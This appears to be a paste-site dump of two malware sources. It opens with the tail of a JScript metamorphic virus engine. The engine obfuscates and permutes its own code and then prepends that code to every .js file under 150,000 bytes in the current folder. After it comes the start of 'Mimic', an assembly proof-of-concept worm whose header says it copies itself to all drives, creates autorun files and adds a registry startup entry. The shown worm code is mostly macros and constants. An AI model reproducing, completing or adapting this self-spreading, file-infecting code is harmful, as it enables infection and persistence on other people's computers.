        MetaLevelLanguage+='__(CFAx20|CFAx10)while(var CFAn=#n0n#$#x1°+CFAn+°1x#!#x2#O1sFunctionVariableNameArray#.length1O#2x#?<@°+CFAn+°=°+CFAn+° +#n1n#)004';
            MetaLevelLanguage+='__(CFAy10|)while(var CFAm=#n0n#$#x1°+CFAm+°1x#!#x2#O1sFunctionVariableNameArray[#x3°+CFAn+°3x#]#.length1O#2x#?<@°+CFAm+°=°+CFAm+° +#n1n#)003';
                MetaLevelLanguage+='__(CFAz10|)if(#x1sFunctionVariableNameArray[#x2°+CFAn+°2x#][#x3°+CFAm+°3x#]1x#!#x4°+CFAObjectName+°4x#?==)001';
                    MetaLevelLanguage+='__(CFAw10|)y°+CFAGetFunctionN+°=#x1°+CFAn+°1x#';
                MetaLevelLanguage+='__(CFAz20|)000';
        MetaLevelLanguage+='__(CFAx30|CFAx20)y°+CFAObjectPlace+°=#x1#O1°+CFAOriginalCode+°#.indexOf(#x2sFunctionVariableFctName[#x3°+CFAGetFunctionN+°3x#]2x#)1O#1x#';
    MetaLevelLanguage+='__(CFA030|)000';
    MetaLevelLanguage+='__(CFA040|CFA020)xreturn(#x1°+CFAObjectPlace+°1x#)';


MetaLevelLanguage+='__(2200|)function fFindPositionForCode(FPFOriginalCode,FPFPosTrace)028';
    MetaLevelLanguage+='__(FPF010|)var FPFVPosArray=#x1[]1x#';                    
    MetaLevelLanguage+='__(FPF020|)var FPFSKPlace=#x1#n0n#1x#';
    MetaLevelLanguage+='__(FPF030|FPF010,FPF020)while($#x1°+FPFSKPlace+°1x#!#x2#n-1n#2x#?!=@)023';
        MetaLevelLanguage+='__(FPFa010|)var FPFSKPlace=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n59n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa020|)var FPFBraPlace=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n123n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa030|)var FPFKetPlace=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n125n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa040|FPFa010,FPFa020,FPFa030)y°+FPFPosTrace+°=#x1#O1Math#.max(#x2°+FPFSKPlace+°2x#,#x3°+FPFBraPlace+°3x#,#x4°+FPFKetPlace+°4x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa050|FPFa040)if(#x1°+FPFPosTrace+°1x#!#x2°+FPFSKPlace+°2x#?==)003';
            MetaLevelLanguage+='__(FPFb010|)if(#x1°+FPFSKPlace+°1x#!#x2#n-1n#2x#?!=)001';
                MetaLevelLanguage+='__(FPFc010|)y°+FPFVPosArray+°.push(#x2#x1°+FPFSKPlace+°1x# +#n2n#2x#)';
            MetaLevelLanguage+='__(FPFb020|)000';
        MetaLevelLanguage+='__(FPFa060|)000';
        MetaLevelLanguage+='__(FPFa070|FPFa050)if(#x1°+FPFPosTrace+°1x#!#x2°+FPFKetPlace+°2x#?==)012';
            MetaLevelLanguage+='__(FPFb010|)if(#x1°+FPFPosTrace+°1x#!#x2#n-1n#2x#?!=)010';
                MetaLevelLanguage+='__(FPFc010|)var FPFFoundKet=#x1#n1n#1x#';
                MetaLevelLanguage+='__(FPFc020|FPFc010)while($#x1°+FPFFoundKet+°1x#!#x2#n0n#2x#?>@)008';
                    MetaLevelLanguage+='__(FPFd010|)y°+FPFBraPlace+°=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n123n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
                    MetaLevelLanguage+='__(FPFd020|)y°+FPFKetPlace+°=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n125n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
                    MetaLevelLanguage+='__(FPFd030|FPFd010,FPFd020)if(#x1°+FPFBraPlace+°1x#!#x2°+FPFKetPlace+°2x#?>)002';
                        MetaLevelLanguage+='__(FPFe010|)c-1(°+FPFFoundKet+°)';
                        MetaLevelLanguage+='__(FPFe020|)y°+FPFPosTrace+°=#x1°+FPFBraPlace+°1x#';
                    MetaLevelLanguage+='__(FPFd030|)002';
                        MetaLevelLanguage+='__(FPFe010|)c+1(°+FPFFoundKet+°)'; 
                        MetaLevelLanguage+='__(FPFe020|)y°+FPFPosTrace+°=#x1°+FPFKetPlace+°1x#';
            MetaLevelLanguage+='__(FPFb020|)000';  
        MetaLevelLanguage+='__(FPFa080|)000';                                  
    MetaLevelLanguage+='__(FPF040|FPF030)y°+FPFVPosArray+°.push(#x1#n0n#1x#)';
    MetaLevelLanguage+='__(FPF050|FPF040)xreturn(#x1°+FPFVPosArray+°1x#)';
                
            

MetaLevelLanguage+='__(2300|)function fCreateVarsAndFuncts(CVFOriginalCode)058';
    MetaLevelLanguage+='__(CVF0000|)var CVFTmpVarNames=#x1sVarNames.slice()1x#'; 
    MetaLevelLanguage+='__(CVF0100|CVF0010,CVF0000)while($#x1#O1sVarDefs#.length1O#1x#!#x2#n0n#2x#?>@)007';
        MetaLevelLanguage+='__(CVFa000|)var CVFNextPlace=#x1fCalculateFirstAppearance(#x2°+CVFOriginalCode+°2x#,#x3sVarNames[#n0n#]3x#)1x#';
        MetaLevelLanguage+='__(CVFa010|)var CVFCToIntegrate=#x1#x2sVarNames[#n0n#]2x#+#x3""=""3x#+#x4sVarDefs[#n0n#]4x#+#x5fGiveMeString(#n64n#)5x#+#x6fGiveMeString(#n59n#)6x#1x#';
        MetaLevelLanguage+='__(CVFa020|CVFa010)ysVarDefs.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CVFa030|CVFa000,CVFa010)ysVarNames.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CVFa040|CVFa000)var CVFVariablePosArray=#x1fFindPositionForCode(#x2°+CVFOriginalCode+°2x#,#x3°+CVFNextPlace+°3x#)1x#';
        MetaLevelLanguage+='__(CVFa050|CVFa040)var CVFNewPos=#x1°+CVFVariablePosArray+°[#x2fGiveRandomNumber(#x3#O1°+CVFVariablePosArray+°#.length1O#3x#)2x#]1x#';
        MetaLevelLanguage+='__(CVFa060|CVFa010,CVFa050)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.substring(#n0n#,#x2°+CVFNewPos+°2x#)1O#+ #x3°+CVFCToIntegrate+°3x# + #x4#O2°+CVFOriginalCode+°#.substring(#x5°+CVFNewPos+°5x#)2O#4x#1x#';      
    MetaLevelLanguage+='__(CVF0200|CVF0000)var CVFNumberOfArrays=#x1fGiveRandomNumber(#x2#O1°+CVFTmpVarNames+°#.length1O#/#n10n#2x#)1x#';
    MetaLevelLanguage+='__(CVF0300|CVF0210,CVF0100,CVF0200)while(var CVFindexk=#n0n#$#x1°+CVFindexk+°1x#!#x2°+CVFNumberOfArrays+°2x#?<@°+CVFindexk+°=°+CVFindexk+° +#n1n#)042';
        MetaLevelLanguage+='__(CVFa010|)var CVFRandNameArr=#x1fGiveRandomString()1x#';
        MetaLevelLanguage+='__(CVFa020|)yCVFTmpVarNames=#x1#O1°+CVFTmpVarNames+°#.sort(#x2fRandomizeFunction2x#)1O#1x#';
        MetaLevelLanguage+='__(CVFa030|)var CVFNumberOfArrayEntries=#x1fGiveRandomNumber(#x2#O1°+CVFTmpVarNames+°#.length1O#/#n3n#2x#)1x#';
        MetaLevelLanguage+='__(CVFa040|CVFa010)var CVFCodeToIntegrate=#x1°+CVFRandNameArr+°1x#';
        MetaLevelLanguage+='__(CVFa050|CVFa040)c+s(°+CVFCodeToIntegrate+°,#x1""=[""1x#)';      
        MetaLevelLanguage+='__(CVFa060|)var CVFArrayIndexCounter=#x1#n0n#1x#';
        MetaLevelLanguage+='__(CVFa070|CVFa020,CVFa030,CVFa050,CVFa060)while(var CVFcounti=#n0n#$#x1°+CVFcounti+°1x#!#x2°+CVFNumberOfArrayEntries+°2x#?<@°+CVFcounti+°=°+CVFcounti+° +#n1n#)033';
            MetaLevelLanguage+='__(CVFb010|)var CVFSearchArrayEntries1=#x1#O1°+CVFOriginalCode+°#.indexOf(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#)1O#1x#';
            MetaLevelLanguage+='__(CVFb020|CVFb010)if(#x1°+CVFSearchArrayEntries1+°1x#!#x2#n-1n#2x#?!=)030'; 
                MetaLevelLanguage+='__(CVFc010|)var CVFSearchArrayEntries2=°+CVFOriginalCode+°.indexOf(°+CVFTmpVarNames+°[°+CVFcounti+°],°+CVFSearchArrayEntries1+° +1)';                
                MetaLevelLanguage+='__(CVFc020|CVFc010)if(#x1°+CVFSearchArrayEntries2+°1x#!#x2#n-1n#2x#?!=)027';
                    MetaLevelLanguage+='__(CVFd010|)var CVFSearchArrayEntries3=#x1#O1°+CVFOriginalCode+°#.indexOf(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#,#x5#x4°+CVFSearchArrayEntries2+°4x# +#n1n#5x#)1O#1x#';
                    MetaLevelLanguage+='__(CVFd020|CVFd010)if(#x1°+CVFSearchArrayEntries3+°1x#!#x2#n-1n#2x#?==)024';
                        MetaLevelLanguage+='__(CVFe010|)var CVFSearchArrayEntries4=#x1#O1°+CVFOriginalCode+°#.indexOf(#x2#x3°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]3x#+#""=""#2x#)1O#1x#';
                        MetaLevelLanguage+='__(CVFe020|CVFe010)var CVFVariableDefinition=#x1#O1°+CVFOriginalCode+°#.substring(#x2°+CVFSearchArrayEntries4+°2x# + #x3°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#].length+#n1n#3x#,#x5°+CVFOriginalCode+°.indexOf(#x6fGiveMeString(#n64n#)+fGiveMeString(#n59n#)6x#,#x7°+CVFSearchArrayEntries4+°7x#)5x#)1O#1x#';                        
                        MetaLevelLanguage+='__(CVFe030|CVFe020)if(#x1fGiveRandomNumber(#n4n#)1x#!#n3n#?<)014';
                            MetaLevelLanguage+='__(CVFf010|)c+s(°+CVFCodeToIntegrate+°,#x1#""funct""#1x#)';
                            MetaLevelLanguage+='__(CVFf020|CVFf010)c+s(°+CVFCodeToIntegrate+°,#x1#""ion(){retu""#1x#)';
                            MetaLevelLanguage+='__(CVFf030|CVFf020)c+s(°+CVFCodeToIntegrate+°,#x1#""rn ""#1x#)';         
                            MetaLevelLanguage+='__(CVFf040|CVFf030)c+s(°+CVFCodeToIntegrate+°,#x1°+CVFVariableDefinition+°1x#)';    
                            MetaLevelLanguage+='__(CVFf050|CVFf040)c+s(°+CVFCodeToIntegrate+°,#x1fGiveMeString(#n59n#)+fGiveMeString(#n125n#)+fGiveMeString(#n44n#)1x#)';  
                            MetaLevelLanguage+='__(CVFf060|)var CVFOldMarker=#x1#O1°+CVFOriginalCode+°#.search(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n88n#)4x#+#x5fGiveMeString(#n64n#)5x#2x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf070|CVFf060)var CVFRes1=#x1(#x2°+CVFOldMarker+°2x#>#x3°+CVFSearchArrayEntries4+°3x#||#x4°+CVFOldMarker+°4x#==#x5#n-1n#5x#)1x#';                            
                            MetaLevelLanguage+='__(CVFf080|CVFf070)if(#x1°+CVFRes1+°1x#!#x2true2x#?==)002';
                                MetaLevelLanguage+='__(CVFg010|)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n88n#)4x#+#x5fGiveMeString(#n64n#)5x#2x#,#""""#)1O#1x#';
                                MetaLevelLanguage+='__(CVFg020|CVFg010)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#+#x4fGiveMeString(#n61n#)4x#+ #x5°+CVFVariableDefinition+°5x# +#x6fGiveMeString(#n64n#)+fGiveMeString(#n59n#)6x#,#x7fGiveMeString(#n64n#)+fGiveMeString(#n88n#)+fGiveMeString(#n64n#)7x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf090|)001';
                                MetaLevelLanguage+='__(CVFg010|)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]+#x5fGiveMeString(#n61n#)5x#+ #x6°+CVFVariableDefinition+°6x# +#x7fGiveMeString(#n64n#)+fGiveMeString(#n59n#)7x#2x#,#x3#""""#3x#)1O#1x#';                                
                            MetaLevelLanguage+='__(CVFf100|CVFf080)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]2x#,#x2#x3°+CVFRandNameArr+°3x# +#x5fGiveMeString(#n91n#)5x#+ #x6°+CVFArrayIndexCounter+°6x# +#x7fGiveMeString(#n93n#)+fGiveMeString(#n40n#)+fGiveMeString(#n41n#)7x#2x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf110|CVFf100)c+1(°+CVFArrayIndexCounter+°)';
                        MetaLevelLanguage+='__(CVFe040|)006';
                            MetaLevelLanguage+='__(CVFf010|)var CVFRandFuncName=#x1fGiveRandomString()1x#';
                            MetaLevelLanguage+='__(CVFf020|CVFf010)ysFunctionNames.push(#x1°+CVFRandFuncName+°1x#)';
                            MetaLevelLanguage+='__(CVFf030|)ysFunctionDefs.push(#x1#x2#""ret""#2x#+#x3#""urn ""#3x#+ #x4°+CVFVariableDefinition+°4x#1x#)';
                            MetaLevelLanguage+='__(CVFf040|)ysFunctionArgs.push(#x1#x2fGiveMeString(#n40n#)2x#+#x3fGiveMeString(#n41n#)3x#1x#)';
                            MetaLevelLanguage+='__(CVFf050|CVFf010)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x3°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]3x#+#x5""=""5x#+ #x6°+CVFVariableDefinition+°6x# +#x7#x8fGiveMeString(#n64n#)8x#+#x9fGiveMeString(#n59n#)9x#7x#,#x2#""""#2x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf060|CVFf050)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#,#x7#x4°+CVFRandFuncName+°4x# +#x5fGiveMeString(#n40n#)5x#+#x6fGiveMeString(#n41n#)6x#7x#)1O#1x#';                  
                    MetaLevelLanguage+='__(CVFd030|)000';
                MetaLevelLanguage+='__(CVFc030|)000';
            MetaLevelLanguage+='__(CVFb030|)000';        
        MetaLevelLanguage+='__(CVFa080|CVFa070)y°+CVFCodeToIntegrate+°=#x1#O1°+CVFCodeToIntegrate+°#.substring(#n0n#,#x2°+CVFCodeToIntegrate+°.length-#n1n#2x#)1O#+#""];""#1x#';       
        MetaLevelLanguage+='__(CVFa090|CVFa080)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2fGiveMeString(#n64n#)+fGiveMeString(#n88n#)+fGiveMeString(#n64n#)2x#,#x3°+CVFCodeToIntegrate+°3x#)1O#1x#'; 
    MetaLevelLanguage+='__(CVF0400|CVF0310,CVF0300)while(var CVFcountj=#n0n#$#x1°+CVFcountj+°1x#!#x2#O1sFunctionDefs#.length1O#2x#?<@°+CVFcountj+°=°+CVFcountj+° +#n1n#)003';    
        MetaLevelLanguage+='__(CVFa100|)var CVFPositionForIntegration=#x1fFindPositionForCode(#x2°+CVFOriginalCode+°2x#,#x3Infinity3x#)1x#';
        MetaLevelLanguage+='__(CVFa200|CVFa100)var CVFIntegrationPosition=#x1°+CVFPositionForIntegration+°[#x2fGiveRandomNumber(#x3#O1°+CVFPositionForIntegration+°#.length1O#3x#)2x#]1x#';
        MetaLevelLanguage+='__(CVFa300|CVFa200)y°+CVFOriginalCode+°=#x1#x2°+CVFOriginalCode+°.substring(#n0n#,#x3°+CVFIntegrationPosition+°3x#)2x#+#x4#""func""#4x#+#""tion ""#+#x6sFunctionNames[°+CVFcountj+°]6x#+#x7sFunctionArgs[°+CVFcountj+°]7x#+#x8fGiveMeString(#n64n#)+fGiveMeString(#n123n#)8x#+#x9sFunctionDefs[°+CVFcountj+°]+fGiveMeString(#n64n#)+fGiveMeString(#n125n#)+ #x5°+CVFOriginalCode+°.substring(°+CVFIntegrationPosition+°)5x#9x#1x#';
    MetaLevelLanguage+='__(CVF0500|CVF0400)xreturn(#x1°+CVFOriginalCode+°1x#)';                    
            
            
MetaLevelLanguage+='__(vvvic|MetaDef)victory:sMetaLevelLanguage=';
MetaLevelLanguage+='__(orgv|vvvic)def OriginalMetaCode=#x1sMetaLevelLanguage1x#';
MetaLevelLanguage+='__(o010|orgv)while($#x1#O1°+sMetaLevelLanguage+°#.indexOf(#x2fGiveMeString(#n58n#)+fGiveMeString(#n45n#)+fGiveMeString(#n41n#)2x#)1O#1x#!#n-1n#?!=@)002';
    MetaLevelLanguage+='__(o011|)y°+sMetaLevelLanguage+°=#x1#O1°+sMetaLevelLanguage+°#.replace(#x2fGiveMeString(#n58n#)+fGiveMeString(#n45n#)+fGiveMeString(#n41n#)2x#,#x3fGiveMeString(#n43n#)+fGiveMeString(#n176n#)3x#)1O#1x#';
    MetaLevelLanguage+='__(o012|)y°+sMetaLevelLanguage+°=#x1#O1°+sMetaLevelLanguage+°#.replace(#x2fGiveMeString(#n40n#)+fGiveMeString(#n45n#)+fGiveMeString(#n58n#)2x#,#x3fGiveMeString(#n176n#)+fGiveMeString(#n43n#)3x#)1O#1x#';    
MetaLevelLanguage+='__(2440|o010)def RndMetaName=#x1fGiveRandomString()1x#';
MetaLevelLanguage+='__(2450|o010,2440)while($#x1#O1sMetaLevelLanguage#.indexOf(#x3#""sMetaLevelLanguage""#3x#)1O#1x#!#x2#n-1n#2x#?!=@)001';
    MetaLevelLanguage+='__(001|)xsMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2#""sMetaLevelLanguage""#2x#,#x3RndMetaName3x#)1O#1x#';
MetaLevelLanguage+='__(2400|2450,o010,PC1000,PC0800,VDef001,VDef002,VDef003,VDef004,VDef005,VDef006,VDef007,VDef008,VDef009,VDef010,VDef011,VDef012,VDef014)def sFullCodeArray=#x1#O1sMetaLevelLanguage#.split(#x2#x3fGiveMeString(#n95n#)3x#+#x4fGiveMeString(#n95n#)4x#2x#)1O#1x#';
MetaLevelLanguage+='__(2500|2400)def sPermCodeArray=#x1fPermutator(#x2#O1sFullCodeArray#.slice()1O#2x#)1x#';
MetaLevelLanguage+='__(2600|PC0800,PC1000,PC1100,VDef015,2500)def sNewCode=#x1fCreateBlockOfCode(#x2sPermCodeArray2x#)1x#';
MetaLevelLanguage+='__(2700|2600)ysFunctionNames.reverse()';
MetaLevelLanguage+='__(2800|2600)ysFunctionDefs.reverse()';
MetaLevelLanguage+='__(2900|2600)ysFunctionArgs.reverse()';
MetaLevelLanguage+='__(3000|2600)ysVarDefs.reverse()';
MetaLevelLanguage+='__(3100|2600)ysVarNames.reverse()';
MetaLevelLanguage+='__(3200|2700,2800,2900,3000,3100)def sFinalCode=#x1fCreateVarsAndFuncts(#x2sNewCode2x#)1x#';
MetaLevelLanguage+='__(3300|3200)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n33n#)3x#+#x4fGiveMeString(#n64n#)4x#+#x5fGiveMeString(#n123n#)5x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x5#x2fGiveMeString(#n33n#)2x#+#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n123n#)4x#5x#,#x6#""""#6x#)1O#1x#';
MetaLevelLanguage+='__(3400|3200)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n33n#)3x#+#x4fGiveMeString(#n64n#)4x#+#x5fGiveMeString(#n125n#)5x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n33n#)3x#+#x4fGiveMeString(#n64n#)4x#+#x5fGiveMeString(#n125n#)5x#2x#,#x6#""""#6x#)1O#1x#';
MetaLevelLanguage+='__(3500|3300)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n123n#)4x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n123n#)4x#2x#,#x5fGiveMeString(#n123n#)5x#)1O#1x#';
MetaLevelLanguage+='__(3600|3400)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n125n#)4x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n125n#)4x#2x#,#x5fGiveMeString(#n125n#)5x#)1O#1x#';
MetaLevelLanguage+='__(3700|3200)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n59n#)4x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n59n#)4x#2x#,#x5fGiveMeString(#n59n#)5x#)1O#1x#';

MetaLevelLanguage+='__(3800|3200)ysFinalCode=#x1fRemoveVariableMask(#x2sFinalCode2x#)1x#';
MetaLevelLanguage+='__(3900|3200)ysFinalCode=#x1fRemoveVariableIndicator(#x2sFinalCode2x#)1x#';

MetaLevelLanguage+='__(4100|)def sfso=#x1#O1WScript#.CreateObject(#x2#""Scripting.FileSystemObject""#2x#)1O#1x#';

MetaLevelLanguage+='__(5000|4100)def CurrentFolder=#x1#O1sfso#.GetFolder(#x2#"".""#2x#)1O#1x#';
MetaLevelLanguage+='__(5100|5000)def AllFiles=#x1#O1CurrentFolder#.Files1O#1x#';
MetaLevelLanguage+='__(5200|5100)def FilesC=#x1new Enumerator(#x2AllFiles2x#)1x#';
MetaLevelLanguage+='__(5300|5200)x#x1#O1FilesC#.moveFirst()1O#1x#';
MetaLevelLanguage+='__(5400|3500,3600,3700,3800,3900,5300)while($#x1#O1FilesC#.atEnd()1O#1x#!#x2false2x#?==@)014';
    MetaLevelLanguage+='__(NF10|)var FileName=#x1#O1FilesC#.item()1O#1x#';
    MetaLevelLanguage+='__(NF20|NF10)var FExt=#x1#O1sfso#.GetExtensionName(#x2°+FileName+°2x#)1O#1x#';
    MetaLevelLanguage+='__(NF30|NF20)if(#x1#O1°+FExt+°#.toUpperCase()1O#1x#!#x2#""JS""#2x#?==)009';        
        MetaLevelLanguage+='__(NFA10|)var hFileRead=#x1#O1sfso#.OpenTextFile(#x2°+FileName+°2x#,#x3#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(NFA20|NFA10)var AllVictimData=#x1#O1°+hFileRead+°#.ReadAll()1O#1x#';
        MetaLevelLanguage+='__(NFA30|NFA20)x#x1#O1°+hFileRead+°#.close()1O#1x#';
        MetaLevelLanguage+='__(NFA50|NFA30)if(#x1#O1°+AllVictimData+°#.length1O#1x#!#x2#n150000n#2x#?<)004';
            MetaLevelLanguage+='__(NFB10|)var hFileWrite=#x1#O1sfso#.OpenTextFile(#x2°+FileName+°2x#,#x3#n2n#3x#)1O#1x#';        
            MetaLevelLanguage+='__(NFB20|)var NewVictimCode=#x1#x2sFinalCode2x#+#x3fGiveMeString(#n13n#)3x#+#x5fGiveMeString(#n10n#)5x#+ #x4°+AllVictimData+°4x#1x#';            
            MetaLevelLanguage+='__(NFB30|NFB10,NFB20)x#x1#O1°+hFileWrite+°#.Write(#x2°+NewVictimCode+°2x#)1O#1x#';
            MetaLevelLanguage+='__(NFB40|NFB30)x#x1#O1°+hFileWrite+°#.close()1O#1x#';   
        MetaLevelLanguage+='__(NFA60|)000';     
    MetaLevelLanguage+='__(NF31|)000';          
    MetaLevelLanguage+='__(NF40|NF10)y#x1#O1FilesC#.moveNext()1O#1x#';


OriginalMetaCode=MetaLevelLanguage;

PreCompilation();
WScript.Echo(""after Precompilation"")
FullCodeArray=MetaLevelLanguage.split('__');

PermCodeArray=Permutator(FullCodeArray.slice());
WScript.Echo(""after permutator"")
HierarchyOfCalls=0;
NewCode=CreateBlockOfCode(PermCodeArray);
WScript.Echo(""after CreateBlockOfCode""+nnn+""VarDefs: ""+VarDefs.length+nnn+""FunctionDefs: ""+FunctionDefs.length)
FunctionNames.reverse();
FunctionDefs.reverse();                          
FunctionArgs.reverse();
VarDefs.reverse();
VarNames.reverse();

FinalCode=CreateVarsAndFuncts(NewCode);
WScript.Echo(""after CreateVarsAndFuncts"")
FinalCode=FinalCode.replace(/!@}/g,'');
FinalCode=FinalCode.replace(/!@{/g,'');
FinalCode=FinalCode.replace(/@}/g,'}'+s(13)+s(10));
FinalCode=FinalCode.replace(/@{/g,'{'+s(13)+s(10));
FinalCode=FinalCode.replace(/@;/g,';'+s(13)+s(10));

FinalCode=RemoveVariableMask(FinalCode);
FinalCode=RemoveVariableIndicator(FinalCode);

WScript.Echo(FinalCode)

fso=WScript.CreateObject(""Scripting.FileSystemObject"");
file=fso.CreateTextFile('Transcript1.js');file.Write(FinalCode);file.close();"
Te3EvVEw,Mimc Proof-of-concept Worm Source Code,FlyFar,ASM (NASM),Tuesday 4th of July 2023 11:30:50 PM CDT,";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; Mimic
;; by Dr. Theodore Spankman
;; December 2010
;;
;;
;; This is a proof-of-concept worm for the technique descriped in an
;; article ""Code Mutations via Behaviour Analysis"".
;;
;; The main idea: The worm analyses the behaviour of its own code, then
;; creates random code and analyses that behaviour, too. If the behaviour
;; is the same, the original code will be substituated by the new ranom code.
;; It can analyse register operations, memory operations and stack operations.
;; For more information, see the article!
;;
;; The worm spreads via copying itself to all fixed and removeable drives,
;; creating an autostart file at removeable drives, and writing a registry
;; entry to start at every windows startup.
;;
;; The worm uses a simple 16bit hash-algorithm to find the APIs in the DLLs,
;; so no need to use hardcoded API names.
;;
;;
;;
;;
;; This is version 0.01, it is probably quite buggy - even I tried my best to
;; prevent that (within the given amount of time) - so dont blame me!
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


include '..\FASM\INCLUDE\win32ax.inc'

macro cc restr*, instr*, op1, op2
{
    ; Macro for padding commands to 8byte each and for
    ; adding the restrictions to the GlobalBehaviourTableList

    local StartCommand, EndCommand
    StartCommand:
    if op2 eq
	if op1 eq
	    instr
	else
	    instr op1
	end if
    else
	instr op1,op2
    end if
    EndCommand:
    times (8-EndCommand+StartCommand): nop	    ; padding

    match any, GlobalBehaviourTableList 	    ; Add further elements to list
    \{
	GlobalBehaviourTableList equ GlobalBehaviourTableList,restr
    \}

    match , GlobalBehaviourTableList		    ; Add first element to list
    \{
	GlobalBehaviourTableList equ restr
    \}
}

macro VEH_TRY c*
{
	cc rNoEmul,  call,    MirrorTheStack

	cc rPSI,     mov,     dword[sESP], esp

	cc rNoRes,   push,    VEH_Handler#c
	cc rNoRes,   push,    0x1
	cc rNoEmul,  stdcall, dword[AddVectoredExceptionHandler]
	cc rNoRes,   mov,     dword[hVEH], eax
}


macro VEH_EXCEPTION c*
{
	cc rNoEmul,  call,    RestoreTheStack
	cc rA,	     xor,     eax, eax
	cc rNoRes,   mov,     dword[bException#c], eax
	cc rNoEmul,  jmp,     VEH_NoException#c

     VEH_Handler#c:
	cc rA,	     mov,     eax, dword[hDataMirror]
	cc rAB,      mov,     ebx, dword[hDataMirror1]

	cc rF,	     cmp,     eax, ebx
	cc rNoEmul,  je,      VEH_HandlerDataMirrorOK#c
	cc rC,	     mov,     ecx, dword[hDataMirror2]
	cc rNoRes,   mov,     dword[hDataMirror], ecx

	VEH_HandlerDataMirrorOK#c:
	cc rNoEmul,  call,    RestoreTheMemory

	cc rNoEmul,  mov,     esp, dword[sESP]

	cc rABCDPSI, mov,     eax, 1
	cc rABCDPSI, mov,     dword[bException#c], eax
	cc rNoEmul,  call,    RestoreTheStack
}


macro VEH_END c*
{
     VEH_NoException#c:
	cc rA,	    mov,     eax, dword[hVEH]
	cc rNoRes,  push,    eax
	cc rNoEmul, stdcall, dword[RemoveVectoredExceptionHandler]
}


.data
DataStart:

	CodeStartInFile EQU 0x600

GlobalBehaviourTableList equ

; eax=A     ebp=P
; ebx=B     esi=S
; ecx=C     edi=I
; edx=D     FLAGS=F

rNoRes	  EQU 00000000b
rA	  EQU 00000001b
rB	  EQU 00000010b
rAB	  EQU 00000011b
rC	  EQU 00000100b
rAC	  EQU 00000101b
rBC	  EQU 00000110b
rABC	  EQU 00000111b
rD	  EQU 00001000b
rAD	  EQU 00001001b
rABD	  EQU 00001011b
rCD	  EQU 00001100b
rACD	  EQU 00001101b
